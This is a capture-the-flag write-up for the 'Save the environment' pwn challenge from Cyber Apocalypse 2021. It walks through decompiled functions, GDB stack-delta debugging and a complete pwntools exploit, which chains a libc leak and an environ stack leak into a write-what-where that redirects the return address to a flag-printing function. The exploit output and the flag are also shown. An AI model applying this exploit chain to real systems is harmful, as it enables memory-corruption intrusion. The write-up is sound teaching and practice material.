# Cyber Apocalypse 2021

## Save the environment

> Extraterrestrial creatures have landed on our planet and drain every resource possible! Rainforests are being destroyed, the oxygen runs low, materials are hard to find. We need to protect our environment at every cost, otherwise there will be no future for humankind..  
> 
> This challenge will raise 43 euros for a good cause.
>
> [`pwn_save_the_environment.zip`](pwn_save_the_environment.zip)

Tags: _pwn_ _x86-64_ _write-what-where_ _rop_


## Summary

libc leak leads to stack leak from `environ`, that leads to stack manipulation that calls a win function.

> Stack deltas can be a bit tricky with remote system.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Most mitigations in place.  No PIE will make for easier ROP.


### Decompile with Ghidra

I'll just cover the functions that looked interesting in the order I read them (alphabetical).

```c
void form(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
         undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8,
         undefined8 param_9,undefined8 param_10,char *param_11,undefined8 param_12,
         undefined8 param_13,undefined8 param_14)
{
  char *__s;
  char *extraout_RDX;
  long in_FS_OFFSET;
  undefined4 extraout_XMM0_Da;
  undefined in_stack_ffffffffffffffc8;
  undefined4 local_2c;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_2c = 0;
  color(param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
        "Is this your first time recycling? (y/n)\n> ","magenta",param_11,param_12,param_13,param_14
        ,in_stack_ffffffffffffffc8);
  read(0,&local_2c,3);
  putchar(10);
  if (((char)local_2c == 'n') || ((char)local_2c == 'N')) {
    rec_count = rec_count + 1;
  }
  if (rec_count < 5) {
    color(extraout_XMM0_Da,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
          "Thank you very much for participating in the recycling program!\n","magenta",extraout_RDX
          ,param_12,param_13,param_14,in_stack_ffffffffffffffc8);
  }
  else {
    if (rec_count < 10) {
      color(extraout_XMM0_Da,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
            "You have already recycled at least 5 times! Please accept this gift: ","magenta",
            extraout_RDX,param_12,param_13,param_14,in_stack_ffffffffffffffc8);
      printf("[%p]\n",printf);
    }
    else {
      if (rec_count == 10) {
        color(extraout_XMM0_Da,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
              "You have recycled 10 times! Feel free to ask me whatever you want.\n> ","cyan",
              extraout_RDX,param_12,param_13,param_14,in_stack_ffffffffffffffc8);
        read(0,local_28,0x10);
        __s = (char *)strtoull(local_28,(char **)0x0,0);
        puts(__s);
      }
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

`form` has a libc leak at `printf("[%p]\n",printf);` IFF the recycle count >= 5 and < 10.  At recycle count 10, you can leak any location value; `read`, `strtoull`, and `puts` will fetch, convert, and emit.

Given the name of the challenge, we just need to compute the location of libc, then get the value of `environ` which will leak the stack _not too far_ from the current stack pointer.

After 5 rounds of recycling:

```
1. Plant a 🌲

2. Recycle ♻
> 2
Recycling will help us craft new materials.
What do you want to recycle?

1. Paper 📜

2. Metal 🔧
> 2
Is this your first time recycling? (y/n)
> n
```

You'll get the output of `printf("[%p]\n",printf);`:

```
You have already recycled at least 5 times! Please accept this gift: [0x7fa6be5dfe10]
```

With this you can compute the location of libc and then get the address of `environ`.


After 5 more rounds of the same as above, you'll be prompted with:

```
You have recycled 10 times! Feel free to ask me whatever you want.
>
```

Here is where you put in the [computed] address of `environ` to leak the stack.

BTW, if you are curious (and I hope you are):

```
gef➤  p/x &environ
$1 = 0x7fa6be76a2e0
gef➤  p/x environ
$2 = 0x7fffd0a72428
gef➤  telescope environ
0x00007fffd0a72428│+0x0000: 0x00007fffd0a736fb  →  "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr[...]"
0x00007fffd0a72430│+0x0008: 0x00007fffd0a7373d  →  "HOSTNAME=7d98dbdedb54"
0x00007fffd0a72438│+0x0010: 0x00007fffd0a73753  →  "TERM=xterm"
0x00007fffd0a72440│+0x0018: 0x00007fffd0a7375e  →  "DISPLAY=172.20.123.123:0"
0x00007fffd0a72448│+0x0020: 0x00007fffd0a73774  →  "LC_CTYPE=C.UTF-8"
0x00007fffd0a72450│+0x0028: 0x00007fffd0a73785  →  "DEBIAN_FRONTEND=noninteractive"
0x00007fffd0a72458│+0x0030: 0x00007fffd0a737a4  →  "HOME=/root"
0x00007fffd0a72460│+0x0038: 0x00007fffd0a737af  →  "LOGNAME=root"
0x00007fffd0a72468│+0x0040: 0x00007fffd0a737bc  →  0x00313d4c564c4853 ("SHLVL=1"?)
0x00007fffd0a72470│+0x0048: 0x00007fffd0a737c4  →  "PWD=/pwd/datajerk/cyberapocalypsectf2021/save_the_[...]"
```

Moving on, the next interesting function is:

```c
void hidden_resources(void)
{
  FILE *__stream;
  size_t sVar1;
  long in_FS_OFFSET;
  int local_64;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined2 local_28;
  undefined local_26;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  puts("You found a hidden vault with resources. You are very lucky!");
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_26 = 0;
  __stream = fopen("./flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Error opening flag.txt, please contact the admin");
    exit(0x16);
  }
  fgets((char *)&local_58,0x32,__stream);
  local_64 = 0;
  while( true ) {
    sVar1 = strlen((char *)&local_58);
    if (sVar1 <= (ulong)(long)local_64) break;
    putchar((int)*(char *)((long)&local_58 + (long)local_64));
    local_64 = local_64 + 1;
  }
  fclose(__stream);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

Clearly, this just dumps the flag.

And finally there's this:

```c
void plant(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
          undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8,
          undefined8 param_9,undefined8 param_10,char *param_11,undefined8 param_12,
          undefined8 param_13,undefined8 param_14)

{
  ulonglong *puVar1;
  ulonglong uVar2;
  char *extraout_RDX;
  char *extraout_RDX_00;
  long in_FS_OFFSET;
  undefined4 uVar3;
  undefined4 extraout_XMM0_Da;
  undefined in_stack_ffffffffffffffa8;
  char local_48 [32];
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  uVar3 = check_fun(param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,rec_count,
                    param_10,param_11,param_12,param_13,param_14);
  color(uVar3,param_2,param_3,param_4,param_5,param_6,param_7,param_8,&DAT_00401a58,"green",
        extraout_RDX,param_12,param_13,param_14,in_stack_ffffffffffffffa8);
  printf("> ");
  read(0,local_48,0x10);
  puVar1 = (ulonglong *)strtoull(local_48,(char **)0x0,0);
  putchar(10);
  color(extraout_XMM0_Da,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
        "Where do you want to plant?\n1. City\n2. Forest\n","green",extraout_RDX_00,param_12,
        param_13,param_14,(char)puVar1);
  printf("> ");
  read(0,local_28,0x10);
  puts("Thanks a lot for your contribution!");
  uVar2 = strtoull(local_28,(char **)0x0,0);
  *puVar1 = uVar2;
  rec_count = 0x16;
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  rec_count = 0x16;
  return;
}
```

Ignore the menu, you can put in any pair of integers and to write a value to any writable location (`*puVar1 = uVar2;`).  IOW, _write-what-where_.

With all this in hand we can use GDB to compute the distance from the `environ` stack leak to the return address of `plant` and set it to address of `hidden_resources` to get the flag.

But first, lets get rid of that annoying alarm.


### No Alarm

```python
#!/usr/bin/env python3

from pwn import *

binary = ELF('./environment')
binary.write(0x401214,5*b'\x90') # alarm
binary.save('./environment_noalarm')
os.chmod('./environment_noalarm',0o755)
```

This will create a new binary without the `alarm`.  There are other ways to do this from the shell or GDB, but I just prefer to patch it out of the binary, and other things that annoy me as well like `usleep`, et al.


### Going the Distance

To compute the distance from `environ` to the return address that will get popped after `plant`, just set a breakpoint at `*plant` in GDB, run the program, then compute the delta:

```
# gef environment_noalarm
gef➤  b *plant
Breakpoint 1 at 0x401383
gef➤  run
Starting program: /pwd/datajerk/cyberapocalypsectf2021/save_the_environment/environment_noalarm

🌲 Save the environment ♻

            *
           ***
          *****
         *******
        *********
       ***********
      *************
     ***************
           | |
           | |
           | |


1. Plant a 🌲

2. Recycle ♻
> 1

gef➤  p/x (long)(environ)-(long)$rsp
$1 = 0x130
```

Easy, right?  Well, this will not work remotely.  This works for Ubuntu 20.04, the version of Ubuntu I have in the Docker container I used for CTFs.

To get the correct delta, you need to use the included `libc` with a matching `ld.so`:

```bash
# LD_LIBARAY_PATH=./ ./ld.so ./environment_noalarm
```

Now we get the correct delta, right?

```
gef➤  p/x (long)(environ)-(long)$rsp
$1 = 0x128
```

Wrong again.  It's off by 8.  And I'm not 100% sure why, and didn't have time to figure it out.  I guessed +/-8 with remote testing and -8 did it.

If you _strings_ the binary:

```
# strings environment | grep -i ubuntu
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
```

You get a hint that they are using Ubuntu 18.04.  The included libc is also from that distro.  Starting up an Ubuntu 18.04 CTF container, gets the correct delta:

```
gef➤  p/x (long)(environ)-(long)$rsp
$1 = 0x120
```


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./environment_noalarm')

if args.REMOTE:
    p = remote('138.68.141.182',31076)
    libc = ELF('./libc.so.6')
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# libc leak
for i in range(5):
    p.sendlineafter('> ','2')
    p.sendlineafter('> ','2')
    p.sendlineafter('> ','n')

p.recvuntil('gift:')
p.recvuntil('[')
p.recvuntil('[')
printf = int(p.recvline().strip(b']\n').decode(),16)
log.info('printf: ' + hex(printf))
libc.address = printf - libc.sym.printf
log.info('libc.address: ' + hex(libc.address))

# stack leak
for i in range(5):
    p.sendlineafter('> ','2')
    p.sendlineafter('> ','2')
    p.sendlineafter('> ','n')

p.sendlineafter('> ',hex(libc.sym.environ))
p.recv(4) # ANSI color, grow up
_ = p.recv(6)
environ = u64(_ + b'\0\0')
log.info('environ: ' + hex(environ))

# plant
p.sendlineafter('> ','1')
p.sendlineafter('> ',hex(environ - 0x120))
p.sendlineafter('> ',hex(binary.sym.hidden_resources))
p.recvline()
p.recvline()
print(p.recvuntil('}').decode())
```

This just follows the analysis and should be pretty easy to follow.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/cyberapocalypsectf2021/save_the_environment/environment_noalarm'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 138.68.141.182 on port 31076: Done
[*] '/pwd/datajerk/cyberapocalypsectf2021/save_the_environment/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] printf: 0x7f1dab14bf70
[*] libc.address: 0x7f1dab0e7000
[*] environ: 0x7fff3f9e1bb8
CHTB{u_s4v3d_th3_3nv1r0n_v4r14bl3!}
```
